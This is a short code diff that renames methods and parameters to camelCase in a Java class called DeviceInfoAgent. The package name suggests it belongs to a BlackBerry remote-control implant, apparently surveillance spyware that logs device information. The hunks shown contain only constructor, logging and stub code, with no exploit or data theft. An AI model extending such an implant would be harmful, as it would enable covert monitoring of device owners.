@@ -8,18 +8,18 @@ import com.ht.rcs.blackberry.utils.DebugLevel;
 public class DeviceInfoAgent extends Agent {
     static Debug debug = new Debug("DeviceInfoAgent", DebugLevel.VERBOSE);
 
-    public DeviceInfoAgent(int AgentStatus) {
-        super(AGENT_DEVICE, AgentStatus, true);
-        Check.asserts(Log.ConvertTypeLog(this.AgentId) == Log.LOGTYPE_DEVICE,
+    public DeviceInfoAgent(int agentStatus) {
+        super(AGENT_DEVICE, agentStatus, true);
+        Check.asserts(Log.convertTypeLog(this.agentId) == Log.LOGTYPE_DEVICE,
                 "Wrong Conversion");
     }
 
-    protected DeviceInfoAgent(int AgentStatus, byte[] confParams) {
-        this(AgentStatus);
-        Parse(confParams);
+    protected DeviceInfoAgent(int agentStatus, byte[] confParams) {
+        this(agentStatus);
+        parse(confParams);
     }
 
-    public void AgentRun() {
+    public void agentRun() {
         debug.trace("run");
 
         Check.requires(log != null, "Null log");
@@ -64,10 +64,10 @@ public class DeviceInfoAgent extends Agent {
 
         log.close();
 
-        this.SleepUntilStopped();
+        this.sleepUntilStopped();
     }
 
-    protected boolean Parse(byte[] confParameters) {
+    protected boolean parse(byte[] confParameters) {
         // TODO Auto-generated method stub
         return false;
     }
